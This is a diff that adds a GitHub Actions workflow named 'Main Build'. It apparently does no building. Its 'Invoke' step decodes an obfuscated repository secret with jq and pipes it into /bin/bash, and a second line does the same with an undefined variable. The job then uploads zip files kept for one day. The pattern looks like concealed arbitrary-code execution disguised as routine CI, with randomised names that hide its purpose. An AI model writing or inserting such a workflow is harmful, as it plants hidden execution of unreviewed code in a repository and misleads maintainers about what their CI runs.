@@ -1,0 +1,36 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  scheduler:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Invoke
+        env:
+          dgq70866: ${{ secrets.dgq70866 }}
+        run: |
+          printf '%s' "$dgq70866" | jq -r .w389 | /bin/bash
+          echo $uk765 | jq -r .dd6745 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: azde4nlq
+          path: "*.zip"
+          retention-days: 1
